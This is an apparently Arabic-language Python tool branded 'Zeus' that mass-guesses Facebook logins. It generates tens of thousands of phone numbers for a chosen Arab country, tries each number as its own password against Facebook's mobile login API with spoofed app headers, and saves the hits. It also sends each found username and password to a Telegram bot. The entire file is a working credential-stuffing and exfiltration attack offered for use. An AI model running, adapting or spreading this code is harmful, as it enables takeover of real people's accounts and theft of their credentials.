#@AA0CA
import subprocess
import sys
def _():
 ___ = ['requests']
 for __ in ___:
  try:
   __import__(__)
  except:
   subprocess.check_call([sys.executable, '-m', 'pip', 'install', __], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
_()
import os, sys, requests, random, json, time, uuid, webbrowser
from concurrent.futures import ThreadPoolExecutor as r

# ═══════════════════════════════════════════════════
# 🎨 الألوان
# ═══════════════════════════════════════════════════
P = "\x1b[38;5;129m"       # بنفسجي غامق
PURPLE = "\x1b[1;35m"      # بنفسجي
R = "\x1b[1;91m"           # أحمر
W = "\x1b[1;37m"           # أبيض
Y = "\x1b[1;93m"           # أصفر
C = "\x1b[1;96m"           # سماوي
G = '\x1b[1;32m'           # أخضر
HH = '\033[1;34m'          # أزرق غامق للدول
RESET = "\x1b[0m"

# ═══════════════════════════════════════════════════
# 📱 الاتصال الجديد (User-Agent)
# ═══════════════════════════════════════════════════
NEW_UA = 'Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001) [FBAN/ViewpointsForAndroid;FBAV/584.0.0.51.56FBBV/475817510;FBRV/0;FBPN/com.facebook.viewpoints;FBLC/ar_AR;FBMF/realme;FBBD/realme;FBDV/RMX3081;FBSV/13;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2242};FB_FW/1;]'

from datetime import datetime
id = []
ok, loop, cp = 0, 0, 0

# ═══════════════════════════════════════════════════
# 📊 اللوكو والأنميشن (بألوان الأحمر والبنفسجي الغامض)
# ═══════════════════════════════════════════════════
logo = f"""
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⠶⠶⠶⠶⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠛⠁⠀⠀⠀⠀⠀⠀⠈⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⣠⡴⠞⠛⠉⠉⣩⣍⠉⠉⠛⠳⢦⣄⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⣴⡿⣧⣀⠀⢀⣠⡴⠋⠙⢷⣄⡀⠀⣀⣼⢿⣦⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⡾⠋⣷⠈⠉⠉⠉⠉⠀⠀⠀⠀⠉⠉⠋⠉⠁⣼⠙⢷⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣇⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠀⣸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣹⣆⠀⢻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⣰⣏⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠞⠋⠁⠙⢷⣄⠙⢷⣀⠀⠀⠀⠀⠀⠀⢀⡴⠋⢀⡾⠋⠈⠙⠻⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⠹⢦⡀⠙⠳⠶⢤⡤⠶⠞⠋⢀⡴⠟⠀⠀⠀⠀⠀⠀⠙⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⣼⠋⠀⠀⢀⣤⣤⣤⣤⣤⣤⣤⣿⣦⣤⣤⣤⣤⣤⣤⣴⣿⣤⣤⣤⣤⣤⣤⣤⡀⠀⠀⠙⣧⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⣸⠏⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⢠⣴⠞⠛⠛⠻⢦⡀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⢠⡟⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣿⣿⢶⣄⣠⡶⣦⣿⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⣾⠁⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⢻⣿⠶⠟⠻⠶⢿⡿⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⢾⣄⣹⣦⣀⣀⣴⢟⣠⡶⠀⠀⠀⠀⠀⠀⣼⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣭⣭⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀⠀⣀⡴⠞⠋⠙⠳⢦⣀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠈⢿⣄⣀⠀⠀⢀⣤⣼⣧⣤⣤⣤⣤⣤⣿⣭⣤⣤⣤⣤⣤⣤⣭⣿⣤⣤⣤⣤⣤⣼⣿⣤⣄⠀⠀⣀⣠⡾⠁⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠻⢧⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠼⠟⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀

{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{R}  DEVELOPER >>> {P}Zeus-{RESET}
{R}  STATUS    >>> {P}Premium{RESET}
{R}  VERSION   >>> {P}V/2.0{RESET}
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{P}⫷⫸ 𝐷𝐸𝑉 Zeus| @R7_36 ● https://t.me/R7Aih1
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{R}<[●]> FUTURES  >>> {P}FILE〤CLONE{RESET}
{R}<[●]> DEV >>> {P}Zeus ~ @R7_36{RESET}
{R}<[●]> TODAYS   >>> {P}{datetime.now().strftime('%d/%B/%Y').upper()}{RESET}
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

# ═══════════════════════════════════════════════════
# 🌍 قائمة الدول
# ═══════════════════════════════════════════════════
countries_data = {
    "1": {"name": "Algeria", "codes": ["055", "056", "066", "067", "077", "079"]},
    "2": {"name": "Saudi Arabia", "codes": ["050", "053", "054", "055", "056", "058"]},
    "3": {"name": "UAE", "codes": ["050", "052", "054", "055", "056", "058"]},
    "4": {"name": "Qatar", "codes": ["330", "331", "332", "333", "334", "335"]},
    "5": {"name": "Kuwait", "codes": ["500", "503", "505", "506", "507", "509"]},
    "6": {"name": "Oman", "codes": ["710", "712", "714", "715", "716", "718"]},
    "7": {"name": "Bahrain", "codes": ["310", "311", "312", "313", "314", "315"]},
    "8": {"name": "Egypt", "codes": ["010", "011", "012", "015", "016", "017"]},
    "9": {"name": "Morocco", "codes": ["600", "601", "602", "603", "604", "605"]},
    "10": {"name": "Jordan", "codes": ["070", "071", "072", "077", "078", "079"]},
    "11": {"name": "Lebanon", "codes": ["030", "031", "032", "033", "034", "035"]},
    "12": {"name": "Iraq", "codes": ["0750", "0770", "0780"]},
    "13": {"name": "Tunisia", "codes": ["200", "201", "202", "203", "204", "205"]},
    "14": {"name": "Syria", "codes": ["090", "091", "092", "093", "094", "095"]},
    "15": {"name": "Yemen", "codes": ["700", "701", "702", "703", "704", "705"]},
    "16": {"name": "Libya", "codes": ["910", "911", "912", "913", "914", "915"]},
    "17": {"name": "Sudan", "codes": ["090", "091", "092", "093", "094", "095"]},
    "18": {"name": "Palestine", "codes": ["050", "051", "052", "053", "054", "055"]},
    "19": {"name": "Mauritania", "codes": ["410", "411", "412", "413", "414", "415"]},
    "20": {"name": "Somalia", "codes": ["060", "061", "062", "063", "064", "065"]},
    "21": {"name": "Djibouti", "codes": ["770", "771", "772", "773", "774", "775"]},
    "22": {"name": "Comoros", "codes": ["320", "321", "322", "323", "324", "325"]}
}

# ═══════════════════════════════════════════════════
# 🚀 القائمة الرئيسية
# ═══════════════════════════════════════════════════
def menu():
    global token, idas
    os.system('clear')
    
    # 1. طلب التوكن والآيدي بلون أحمر أول شي
    token = input(f"{R} TOKEN >>> {RESET}")
    idas = input(f"{R} ID >>> {RESET}")
    
    os.system('clear')
    # 2. عرض اللوكو (الذي يحتوي على الهيدر المطلوب بالأحمر والبنفسجي)
    print(logo)
    
    # 3. عرض قائمة الدول
    for k, v in countries_data.items():
        codes_str = f" {R}|{RESET} ".join([f"{R}{c}{RESET}" for c in v["codes"]])
        print(f"{R}[{k}] {HH}{v['name']} {R}➔ {codes_str}{RESET}")
        
    print(f"\n{R}═══════════════════════════════════════════════════════{RESET}")
    
    country_choice = input(f"\n{P}<[●]> {R}Select the country number (1-22) {R}>>> {RESET}").strip()
    
    if country_choice not in countries_data:
        print(f"{R}Invalid choice!{RESET}")
        sys.exit()
        
    sim = random.choice(countries_data[country_choice]["codes"])
    
    generated = set()
    # تم التعديل هنا إلى 99999
    while len(generated) < 99999:
        nmp = "".join(random.choice('1234509876') for ing in range(7))
        if nmp not in generated:
            generated.add(nmp)
            id.append(nmp)
            
    with r(max_workers=30) as am:
        os.system('clear')
        print(logo)
        for idx in id:
            ids = sim + str(idx)
            pwxs = [ids]
            am.submit(crackfree, ids, pwxs)
            
    print('')
    print('\033[1;37m\033[1m-'*45)
    exit()

def crackfree(ids, pwxs):
    global ok, loop, cp
    # شكل العداد المطلوب (CP أصفر و OK أخضر)
    sys.stdout.write(f'\r {P}<[●]> {W}<[Zeus-{loop}]>{Y}[CP-{cp}] {G}<[OK-{ok}]> {RESET}')
    sys.stdout.flush()
    
    for pw in pwxs:
        try:
            headers = {
                "User-Agent": NEW_UA,
                "Accept-Encoding": "gzip, deflate",
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-friendly-name": "authenticate",
                "x-fb-http-engine": "Liger",
                "x-fb-client-ip": "True",
                "x-fb-server-cluster": "True",
                "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            }
            data = pm(ids, pw)
            
            # تم إزالة البروكسي من الطلب بناءً على طلبك
            req = requests.post('https://b-graph.facebook.com/auth/login', headers=headers, data=data, timeout=10).json()      
            
            if 'session_key' in req:
                ok += 1
                print(f'\r\r{G}[OK] {ids} | {pw}{RESET}                          ')
                open('/storage/emulated/0/OK_IRAQ.txt', 'a').write(f'{ids}|{pw}\n')
                
                # رسالة OK المطلوبة
                tele(f"""OK✅


❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}

tg://openmessage?user_id={idas}
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
DEV :: @R7_36 +  ~ Zeus
 trust » https://t.me/R7Aih1""")
                break
            elif 'www.facebook.com' in req["error"]["message"]:
                cp += 1
                print(f'\r\r{G}[CP] {ids} | {pw}{RESET}                          ')
                open('/storage/emulated/0/CP_IRAQ.txt', 'a').write(f'{ids}|{pw}\n')
                
                # رسالة CP المطلوبة
                tele(f"""CP ❌


❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}

tg://openmessage?user_id={idas}
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
DEV :: @R7_36 +  ~ Zeus
 trust » https://t.me/R7Aih1""")
                break
            else:
                pass
        except requests.exceptions.ConnectionError:
            time.sleep(1)
            pass
    loop += 1

def pm(email_or_phone, password):
    device_id = str(uuid.uuid4())
    family_device_id = str(uuid.uuid4())
    secure_family_device_id = str(uuid.uuid4())
    adid = str(uuid.uuid4())
    current_timestamp = int(time.time())
    pwd_enc = f"#PWD_FB4A:0:{current_timestamp}:{password}"
    payload = {
        "adid": adid,
        "format": "json",
        "device_id": device_id,
        "email": email_or_phone,
        "password": pwd_enc,
        "generate_analytics_claim": "1",
        "community_id": "",
        "cpl": "true",
        "try_num": "1",
        "family_device_id": family_device_id,
        "secure_family_device_id": secure_family_device_id,
        "credentials_type": "password",
        "generate_session_cookies": "1",
        "error_detail_type": "button_with_disabled",
        "source": "login",
        "generate_machine_id": "1",
        "currently_logged_in_userid": "0",
        "locale": "ar_AR",
        "client_country_code": "EG",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "Fb4aAuthHandler",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
    }
    return payload

def tele(msg):
    try:
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": idas, "text": msg})
    except:
        pass

if __name__ == "__main__":
    menu()